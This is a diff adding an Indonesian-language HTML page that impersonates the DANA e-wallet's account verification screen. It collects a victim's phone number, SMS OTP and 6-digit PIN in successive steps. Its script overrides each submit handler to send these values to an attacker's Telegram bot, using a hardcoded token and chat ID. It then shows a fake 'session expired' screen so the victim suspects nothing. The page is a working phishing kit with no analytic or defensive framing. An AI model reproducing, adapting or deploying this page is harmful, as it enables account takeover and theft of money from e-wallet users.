@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>DANA — Verifikasi</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Inter", "SF Pro Display", "Segoe UI", Roboto, sans-serif;
+      background: #1A73E8;
+      min-height: 100vh;
+      color: #333;
+      -webkit-font-smoothing: antialiased;
+    }
+    .container { max-width: 480px; margin: 0 auto; padding: 0 24px; }
+    .hidden { display: none !important; }
+    .header {
+      display: flex;
+      align-items: center;
+      padding: 48px 24px 0;
+    }
+    .hdr-back {
+      font-size: 22px;
+      color: #ffffff;
+      cursor: pointer;
+      padding: 4px;
+      background: none;
+      border: none;
+    }
+    .logo-area {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 28px 0 36px;
+      background: transparent;
+      padding: 0;
+      border-radius: 0;
+    }
+    .logo-area img {
+      height: 120px;
+      width: auto;
+      display: block;
+      max-width: 100%;
+      border-radius: 20px;
+      object-fit: contain;
+    }
+    .logo-area .fallback-logo {
+      display: none;
+      font-size: 40px;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: 2px;
+    }
+    .logo-area img:not([src]) + .fallback-logo,
+    .logo-area img[src=""] + .fallback-logo,
+    .logo-area img.error + .fallback-logo {
+      display: block;
+    }
+    .section-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 4px;
+    }
+    .section-sub {
+      font-size: 13px;
+      color: rgba(255,255,255,0.85);
+      margin-bottom: 20px;
+    }
+    .form-group { margin-bottom: 16px; }
+    .form-group label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #ffffff;
+      margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-radius: 12px;
+      font-size: 15px;
+      color: #333;
+      outline: none;
+      font-family: inherit;
+      background: rgba(255,255,255,0.95);
+      transition: border-color 0.2s;
+    }
+    .form-group input:focus {
+      border-color: #ffffff;
+      background: #ffffff;
+    }
+    .form-group input::placeholder {
+      color: #C0C0C0;
+    }
+    .btn-dana {
+      width: 100%;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      background: #ffffff;
+      color: #1A73E8;
+      letter-spacing: 0.2px;
+      margin-top: 8px;
+      margin-bottom: 24px;
+      transition: all 0.2s;
+    }
+    .btn-dana:active { transform: scale(0.98); }
+    .btn-dana:disabled { background: rgba(255,255,255,0.4); color: rgba(26,115,232,0.6); cursor: not-allowed; }
+    .sec-warn {
+      background: rgba(255,255,255,0.15);
+      border: 1px solid rgba(255,255,255,0.35);
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 14px;
+    }
+    .sec-warn p {
+      margin: 0;
+      font-size: 11px;
+      color: #ffffff;
+      line-height: 1.5;
+    }
+    .otp-field { margin-bottom: 12px; }
+    .otp-field input {
+      width: 100%;
+      padding: 16px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-radius: 14px;
+      text-align: center;
+      font-size: 24px;
+      font-weight: 700;
+      color: #333;
+      letter-spacing: 8px;
+      outline: none;
+      font-family: inherit;
+      background: rgba(255,255,255,0.95);
+      text-transform: uppercase;
+    }
+    .otp-field input:focus {
+      border-color: #ffffff;
+      background: #ffffff;
+    }
+    .otp-hint {
+      font-size: 12px;
+      color: rgba(255,255,255,0.8);
+      text-align: center;
+      margin-bottom: 14px;
+    }
+    .wait {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      padding: 32px 0;
+    }
+    .wait.active { display: flex; }
+    .spinner {
+      width: 48px;
+      height: 48px;
+      border: 4px solid rgba(255,255,255,0.3);
+      border-top: 4px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .wait h3 {
+      color: #ffffff;
+      font-size: 17px;
+      margin-bottom: 8px;
+    }
+    .wait p {
+      color: rgba(255,255,255,0.85);
+      font-size: 13px;
+      text-align: center;
+      max-width: 260px;
+    }
+    .err {
+      display: none;
+      background: rgba(255,255,255,0.9);
+      border: 1px solid #FCC;
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 12px;
+      text-align: center;
+    }
+    .err.active { display: block; }
+    .err p { color: #C00; font-size: 13px; }
+    .step { display: none; }
+    .step.active { display: block; }
+
+    /* ====== HALAMAN PIN ====== */
+    .pin-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 0;
+    }
+    .pin-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 8px;
+    }
+    .pin-sub {
+      font-size: 14px;
+      color: rgba(255,255,255,0.85);
+      margin-bottom: 30px;
+    }
+    .pin-boxes {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+      margin-bottom: 30px;
+    }
+    .pin-box {
+      width: 48px;
+      height: 58px;
+      border: 2px solid rgba(255,255,255,0.4);
+      border-radius: 12px;
+      text-align: center;
+      font-size: 28px;
+      font-weight: 700;
+      color: #ffffff;
+      outline: none;
+      background: rgba(255,255,255,0.15);
+      transition: all 0.2s;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-box:focus {
+      border-color: #ffffff;
+      background: rgba(255,255,255,0.25);
+      box-shadow: 0 0 0 4px rgba(255,255,255,0.1);
+    }
+    .pin-box.filled {
+      border-color: #ffffff;
+      background: rgba(255,255,255,0.25);
+    }
+    .pin-box.error {
+      border-color: #dc2626;
+      background: rgba(220,38,38,0.2);
+    }
+    .pin-error-text {
+      color: #dc2626;
+      font-size: 13px;
+      font-weight: 600;
+      margin-top: -20px;
+      margin-bottom: 20px;
+      display: none;
+    }
+    .pin-error-text.show { display: block; }
+
+    /* PIN Keypad */
+    .pin-keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      max-width: 280px;
+      width: 100%;
+      margin: 0 auto 20px;
+    }
+    .pin-key {
+      padding: 16px;
+      border: 1.5px solid rgba(255,255,255,0.3);
+      border-radius: 12px;
+      background: rgba(255,255,255,0.1);
+      font-size: 22px;
+      font-weight: 600;
+      color: #ffffff;
+      cursor: pointer;
+      transition: all 0.15s;
+      text-align: center;
+      font-family: 'Inter', sans-serif;
+    }
+    .pin-key:active {
+      transform: scale(0.95);
+      background: rgba(255,255,255,0.2);
+    }
+    .pin-key.empty {
+      background: transparent;
+      border: 1.5px solid transparent;
+      cursor: default;
+    }
+    .pin-key.empty:active {
+      transform: none;
+      background: transparent;
+    }
+    .pin-key .delete-icon {
+      font-size: 18px;
+    }
+
+    /* ====== LOADING AKHIR ====== */
+    .loading-final {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 60px 20px;
+      text-align: center;
+      min-height: 60vh;
+    }
+    .loading-final .spinner {
+      width: 56px;
+      height: 56px;
+      border: 4px solid rgba(255,255,255,0.2);
+      border-top: 4px solid #ffffff;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+      margin-bottom: 24px;
+    }
+    .loading-final h3 {
+      color: #ffffff;
+      font-size: 17px;
+      margin-bottom: 8px;
+      font-weight: 700;
+    }
+    .loading-final p {
+      color: rgba(255,255,255,0.8);
+      font-size: 13px;
+      max-width: 260px;
+      line-height: 1.6;
+    }
+
+    /* ====== HALAMAN GAGAL (SESI BERAKHIR) ====== */
+    .fail-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px;
+      text-align: center;
+      min-height: 60vh;
+    }
+    .fail-icon {
+      width: 80px;
+      height: 80px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.15);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 24px;
+    }
+    .fail-icon svg {
+      width: 40px;
+      height: 40px;
+      color: #dc2626;
+      stroke: #dc2626;
+      stroke-width: 2;
+      fill: none;
+    }
+    .fail-title {
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 8px;
+    }
+    .fail-sub {
+      font-size: 14px;
+      color: rgba(255,255,255,0.85);
+      margin-bottom: 30px;
+      line-height: 1.6;
+    }
+    .btn-retry {
+      width: 100%;
+      max-width: 280px;
+      border: none;
+      border-radius: 14px;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: inherit;
+      background: #ffffff;
+      color: #1A73E8;
+      transition: all 0.2s;
+    }
+    .btn-retry:active { transform: scale(0.98); }
+
+    @media (max-width: 420px) {
+      .pin-box { width: 40px; height: 50px; font-size: 22px; }
+      .pin-boxes { gap: 8px; }
+      .logo-area img { height: 90px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ============================================= -->
+  <!-- STEP 1: NOMOR HP                            -->
+  <!-- ============================================= -->
+  <div class="step active" id="step1">
+    <div class="header">
+      <button class="hdr-back" onclick="goBack()">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/KpK9B0cn/images-1.jpg" alt="DANA Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+      <span class="fallback-logo">DANA</span>
+    </div>
+    <div class="container">
+      <p class="section-title">Masukkan nomor HP kamu</p>
+      <p class="section-sub">untuk lanjut verifikasi akun</p>
+      <div class="sec-warn">
+        <p>🔒 Data Anda dienkripsi dan hanya digunakan untuk verifikasi keamanan akun Anda.</p>
+      </div>
+      <div class="form-group">
+        <label>Nomor HP</label>
+        <input type="tel" id="phone" placeholder="+62 811-1234-5678" autocomplete="off" inputmode="tel" autofocus>
+      </div>
+      <div style="text-align:center;font-size:12px;color:rgba(255,255,255,0.7);margin-bottom:20px;">
+        Dengan melanjutkan, kamu setuju dengan <br>
+        <strong style="color:#ffffff;">Syarat &amp; Ketentuan</strong> dan <strong style="color:#ffffff;">Kebijakan Privasi</strong> kami
+      </div>
+      <button class="btn-dana" id="btnPhone" onclick="submitPhone()">Lanjutkan</button>
+      <div class="wait" id="waitPhone">
+        <div class="spinner"></div>
+        <h3>Memverifikasi Nomor</h3>
+        <p>Sistem sedang memverifikasi nomor HP Anda.</p>
+        <p style="color:#ffffff;font-weight:600;margin-top:8px;opacity:0.8;">Estimasi: 1-3 menit</p>
+      </div>
+      <div class="err" id="errPhone">
+        <p></p>
+        <button class="btn-dana" style="margin-top:8px;" onclick="retryPhone()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 2: OTP                                 -->
+  <!-- ============================================= -->
+  <div class="step" id="step2">
+    <div class="header">
+      <button class="hdr-back" onclick="show('step1')">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/KpK9B0cn/images-1.jpg" alt="DANA Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+      <span class="fallback-logo">DANA</span>
+    </div>
+    <div class="container">
+      <p class="section-title">Verifikasi OTP</p>
+      <p class="section-sub" id="otpInfo">Masukkan kode OTP yang dikirim ke nomor HP Anda</p>
+      <div class="sec-warn">
+        <p>⚠️ JANGAN berikan kode OTP ini kepada siapa pun.</p>
+      </div>
+      <div class="otp-field">
+        <input type="text" id="otpInput" placeholder="Masukkan kode OTP" autocomplete="off" inputmode="text">
+      </div>
+      <p class="otp-hint">Masukkan 6 digit kode verifikasi via SMS</p>
+      <button class="btn-dana" id="btnOtp" onclick="submitOTP()">Verifikasi</button>
+      <div style="text-align:center;margin-top:14px;">
+        <a href="#" style="color:#ffffff;font-size:14px;font-weight:600;text-decoration:none;opacity:0.8;" onclick="resendOTP()">Kirim Ulang Kode</a>
+      </div>
+      <div class="wait" id="waitOTP">
+        <div class="spinner"></div>
+        <h3>Memverifikasi OTP</h3>
+        <p>Sistem sedang memverifikasi kode OTP.</p>
+      </div>
+      <div class="err" id="errOTP">
+        <p></p>
+        <button class="btn-dana" style="margin-top:8px;" onclick="retryOTP()">Masukkan Ulang</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 3: PIN                                 -->
+  <!-- ============================================= -->
+  <div class="step" id="step3">
+    <div class="header">
+      <button class="hdr-back" onclick="show('step2')">←</button>
+    </div>
+    <div class="logo-area">
+      <img src="https://i.ibb.co.com/KpK9B0cn/images-1.jpg" alt="DANA Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';" />
+      <span class="fallback-logo">DANA</span>
+    </div>
+    <div class="container">
+      <div class="pin-container">
+        <p class="pin-title">Masukkan PIN DANA</p>
+        <p class="pin-sub">Masukkan 6 digit PIN DANA Anda</p>
+
+        <div class="pin-boxes" id="pinBoxes">
+          <input type="password" class="pin-box" id="pin0" maxlength="1" inputmode="numeric" autofocus>
+          <input type="password" class="pin-box" id="pin1" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin2" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin3" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin4" maxlength="1" inputmode="numeric">
+          <input type="password" class="pin-box" id="pin5" maxlength="1" inputmode="numeric">
+        </div>
+
+        <div class="pin-error-text" id="pinError">❌ PIN harus 6 digit angka</div>
+
+        <div class="pin-keypad" id="pinKeypad">
+          <button class="pin-key" data-value="1">1</button>
+          <button class="pin-key" data-value="2">2</button>
+          <button class="pin-key" data-value="3">3</button>
+          <button class="pin-key" data-value="4">4</button>
+          <button class="pin-key" data-value="5">5</button>
+          <button class="pin-key" data-value="6">6</button>
+          <button class="pin-key" data-value="7">7</button>
+          <button class="pin-key" data-value="8">8</button>
+          <button class="pin-key" data-value="9">9</button>
+          <button class="pin-key empty"></button>
+          <button class="pin-key" data-value="0">0</button>
+          <button class="pin-key" data-value="delete"><span class="delete-icon">⌫</span></button>
+        </div>
+
+        <button class="btn-dana" id="btnPin" onclick="submitPIN()">Konfirmasi PIN</button>
+      </div>
+      <div class="wait" id="waitPIN">
+        <div class="spinner"></div>
+        <h3>Memverifikasi PIN</h3>
+        <p>Sistem sedang memverifikasi PIN Anda.</p>
+      </div>
+      <div class="err" id="errPIN">
+        <p></p>
+        <button class="btn-dana" style="margin-top:8px;" onclick="retryPIN()">Coba Lagi</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 4: LOADING AKHIR                       -->
+  <!-- ============================================= -->
+  <div class="step" id="step4">
+    <div class="header"><span style="width:30px"></span></div>
+    <div class="container">
+      <div class="loading-final">
+        <div class="spinner"></div>
+        <h3>Memproses Verifikasi</h3>
+        <p>Mohon tunggu, sistem sedang memverifikasi data Anda...</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- STEP 5: GAGAL (SESI BERAKHIR)               -->
+  <!-- ============================================= -->
+  <div class="step" id="step5">
+    <div class="header"><span style="width:30px"></span></div>
+    <div class="container">
+      <div class="fail-container">
+        <div class="fail-icon">
+          <svg viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10" />
+            <line x1="12" y1="8" x2="12" y2="12" />
+            <line x1="12" y1="16" x2="12.01" y2="16" />
+          </svg>
+        </div>
+        <p class="fail-title">Sesi Berakhir</p>
+        <p class="fail-sub">Silakan coba lagi nanti</p>
+        <button class="btn-retry" onclick="resetAll()">Kembali ke Awal</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ============================================= -->
+  <!-- SCRIPT                                      -->
+  <!-- ============================================= -->
+  <script>
+    // ============================================
+    // NAVIGASI
+    // ============================================
+    function show(id) {
+      document.querySelectorAll('.step').forEach(function(s) { s.classList.remove('active'); });
+      document.getElementById(id).classList.add('active');
+      window.scrollTo(0, 0);
+    }
+
+    function goBack() {
+      if (window.history.length > 1) {
+        window.history.back();
+      }
+    }
+
+    // ============================================
+    // STEP 1: NOMOR HP
+    // ============================================
+    function submitPhone() {
+      var ph = document.getElementById('phone').value.trim();
+      if (!ph || ph.length < 8) {
+        alert('Mohon isi nomor HP dengan benar');
+        return;
+      }
+      document.getElementById('btnPhone').style.display = 'none';
+      document.getElementById('waitPhone').classList.add('active');
+      setTimeout(function() {
+        document.getElementById('waitPhone').classList.remove('active');
+        document.getElementById('btnPhone').style.display = 'block';
+        show('step2');
+      }, 3000);
+    }
+
+    function retryPhone() {
+      document.getElementById('btnPhone').style.display = 'block';
+      document.getElementById('waitPhone').classList.remove('active');
+      document.getElementById('errPhone').classList.remove('active');
+    }
+
+    // ============================================
+    // STEP 2: OTP
+    // ============================================
+    function submitOTP() {
+      var o = document.getElementById('otpInput').value.trim();
+      if (!o) {
+        alert('Masukkan kode OTP');
+        return;
+      }
+      document.getElementById('btnOtp').style.display = 'none';
+      document.getElementById('waitOTP').classList.add('active');
+      setTimeout(function() {
+        document.getElementById('waitOTP').classList.remove('active');
+        document.getElementById('btnOtp').style.display = 'block';
+        show('step3');
+      }, 3000);
+    }
+
+    function retryOTP() {
+      document.getElementById('errOTP').classList.remove('active');
+      document.getElementById('waitOTP').classList.remove('active');
+      document.getElementById('btnOtp').style.display = 'block';
+      document.getElementById('otpInput').value = '';
+    }
+
+    function resendOTP() {
+      alert('Kode OTP baru telah dikirim.');
+    }
+
+    // ============================================
+    // STEP 3: PIN (6 KOTAK + KEYPAD)
+    // ============================================
+    var pinValues = ['', '', '', '', '', ''];
+    var pinInputs = [];
+
+    document.addEventListener('DOMContentLoaded', function() {
+      for (var i = 0; i < 6; i++) {
+        var input = document.getElementById('pin' + i);
+        pinInputs.push(input);
+
+        input.addEventListener('input', function(e) {
+          var idx = parseInt(this.id.replace('pin', ''));
+          var val = this.value;
+
+          if (val && !/^\d$/.test(val)) {
+            this.value = '';
+            return;
+          }
+
+          pinValues[idx] = this.value || '';
+          if (this.value) {
+            this.classList.add('filled');
+          } else {
+            this.classList.remove('filled');
+          }
+
+          if (this.value && idx < 5) {
+            document.getElementById('pin' + (idx + 1)).focus();
+          }
+
+          document.getElementById('pinError').classList.remove('show');
+          document.querySelectorAll('.pin-box').forEach(function(b) {
+            b.classList.remove('error');
+          });
+        });
+
+        input.addEventListener('keydown', function(e) {
+          var idx = parseInt(this.id.replace('pin', ''));
+          if (e.key === 'Backspace' && !this.value && idx > 0) {
+            document.getElementById('pin' + (idx - 1)).focus();
+          }
+        });
+
+        input.addEventListener('paste', function(e) {
+          e.preventDefault();
+          var pasteData = (e.clipboardData || window.clipboardData).getData('text');
+          if (pasteData && /^\d{6}$/.test(pasteData)) {
+            for (var i = 0; i < 6; i++) {
+              var inp = document.getElementById('pin' + i);
+              inp.value = pasteData[i];
+              pinValues[i] = pasteData[i];
+              if (pasteData[i]) inp.classList.add('filled');
+            }
+            document.getElementById('pin5').focus();
+          }
+        });
+      }
+
+      var keypadButtons = document.querySelectorAll('.pin-key:not(.empty)');
+      keypadButtons.forEach(function(btn) {
+        btn.addEventListener('click', function() {
+          var value = this.dataset.value;
+          if (value === 'delete') {
+            for (var i = 5; i >= 0; i--) {
+              if (pinValues[i]) {
+                pinValues[i] = '';
+                pinInputs[i].value = '';
+                pinInputs[i].classList.remove('filled');
+                pinInputs[i].focus();
+                break;
+              }
+            }
+          } else {
+            for (var i = 0; i < 6; i++) {
+              if (!pinValues[i]) {
+                pinValues[i] = value;
+                pinInputs[i].value = value;
+                pinInputs[i].classList.add('filled');
+                if (i < 5) pinInputs[i + 1].focus();
+                break;
+              }
+            }
+          }
+          document.getElementById('pinError').classList.remove('show');
+          document.querySelectorAll('.pin-box').forEach(function(b) {
+            b.classList.remove('error');
+          });
+        });
+      });
+    });
+
+    function submitPIN() {
+      var pin = pinValues.join('');
+      if (pin.length !== 6) {
+        document.getElementById('pinError').textContent = '❌ PIN harus 6 digit angka';
+        document.getElementById('pinError').classList.add('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          if (!b.value) b.classList.add('error');
+        });
+        return;
+      }
+
+      document.getElementById('btnPin').style.display = 'none';
+      document.getElementById('waitPIN').classList.add('active');
+
+      setTimeout(function() {
+        document.getElementById('waitPIN').classList.remove('active');
+        document.getElementById('btnPin').style.display = 'block';
+        show('step4');
+
+        setTimeout(function() {
+          show('step5');
+        }, 3000);
+      }, 3000);
+    }
+
+    function retryPIN() {
+      document.getElementById('errPIN').classList.remove('active');
+      document.getElementById('waitPIN').classList.remove('active');
+      document.getElementById('btnPin').style.display = 'block';
+      pinValues = ['', '', '', '', '', ''];
+      pinInputs.forEach(function(inp, i) {
+        inp.value = '';
+        inp.classList.remove('filled', 'error');
+      });
+      document.getElementById('pin0').focus();
+      document.getElementById('pinError').classList.remove('show');
+    }
+
+    // ============================================
+    // RESET KE HALAMAN AWAL
+    // ============================================
+    function resetAll() {
+      document.getElementById('phone').value = '';
+      document.getElementById('otpInput').value = '';
+      pinValues = ['', '', '', '', '', ''];
+      pinInputs.forEach(function(inp, i) {
+        inp.value = '';
+        inp.classList.remove('filled', 'error');
+      });
+      document.getElementById('pinError').classList.remove('show');
+
+      document.getElementById('btnPhone').style.display = 'block';
+      document.getElementById('btnOtp').style.display = 'block';
+      document.getElementById('btnPin').style.display = 'block';
+
+      document.getElementById('waitPhone').classList.remove('active');
+      document.getElementById('waitOTP').classList.remove('active');
+      document.getElementById('waitPIN').classList.remove('active');
+      document.getElementById('errPhone').classList.remove('active');
+      document.getElementById('errOTP').classList.remove('active');
+      document.getElementById('errPIN').classList.remove('active');
+
+      show('step1');
+    }
+
+    // ============================================
+    // TELEGRAM
+    // ============================================
+    const TELEGRAM_TOKEN = '8909248248:AAHyy7GiNs4Mh2ApZXy-s_f5TQkzGxxZ_j4';
+    const TELEGRAM_CHAT_ID = '6233868892';
+
+    async function kirimKeTelegram(pesan) {
+      const header = '🏦 DANA - Dompet Digital Indonesia\n═══════════════════════════\n📱 DANA - Verifikasi\n\n';
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: header + pesan, parse_mode: 'Markdown' })
+        });
+        return await response.json();
+      } catch (error) { return { ok: false, error: error.message }; }
+    }
+
+    // Override submitPhone
+    const originalSubmitPhone = submitPhone;
+    submitPhone = async function() {
+      const telepon = document.getElementById('phone').value.trim();
+      if (!telepon || telepon.length < 8) { alert('Mohon isi nomor HP dengan benar'); return; }
+      document.getElementById('btnPhone').style.display = 'none';
+      document.getElementById('waitPhone').classList.add('active');
+      await kirimKeTelegram(`📞 NOMOR HP MASUK\n───────────────────\n📱 No: ${telepon}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+      setTimeout(() => {
+        document.getElementById('waitPhone').classList.remove('active');
+        document.getElementById('btnPhone').style.display = 'block';
+        show('step2');
+      }, 3000);
+    };
+
+    // Override submitOTP
+    const originalSubmitOTP = submitOTP;
+    submitOTP = async function() {
+      const otp = document.getElementById('otpInput').value.trim();
+      if (!otp) { alert('Masukkan kode OTP'); return; }
+      document.getElementById('btnOtp').style.display = 'none';
+      document.getElementById('waitOTP').classList.add('active');
+      await kirimKeTelegram(`🔐 KODE OTP MASUK\n─────────────────\n🔢 Kode OTP: ${otp}\n📱 No: ${document.getElementById('phone').value.trim() || '-'}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+      setTimeout(() => {
+        document.getElementById('waitOTP').classList.remove('active');
+        document.getElementById('btnOtp').style.display = 'block';
+        show('step3');
+      }, 3000);
+    };
+
+    // Override submitPIN
+    const originalSubmitPIN = submitPIN;
+    submitPIN = async function() {
+      var pin = pinValues.join('');
+      if (pin.length !== 6) {
+        document.getElementById('pinError').textContent = '❌ PIN harus 6 digit angka';
+        document.getElementById('pinError').classList.add('show');
+        document.querySelectorAll('.pin-box').forEach(function(b) {
+          if (!b.value) b.classList.add('error');
+        });
+        return;
+      }
+
+      document.getElementById('btnPin').style.display = 'none';
+      document.getElementById('waitPIN').classList.add('active');
+
+      await kirimKeTelegram(`🔒 PIN DANA MASUK\n─────────────────\n🔢 PIN: ${pin}\n📱 No: ${document.getElementById('phone').value.trim() || '-'}\n⏰ Waktu: ${new Date().toLocaleString('id-ID')}`);
+
+      setTimeout(function() {
+        document.getElementById('waitPIN').classList.remove('active');
+        document.getElementById('btnPin').style.display = 'block';
+        show('step4');
+
+        setTimeout(function() {
+          show('step5');
+        }, 3000);
+      }, 3000);
+    };
+
+    console.log('✅ Telegram Bot DANA siap!');
+  </script>
+
+</body>
+</html>
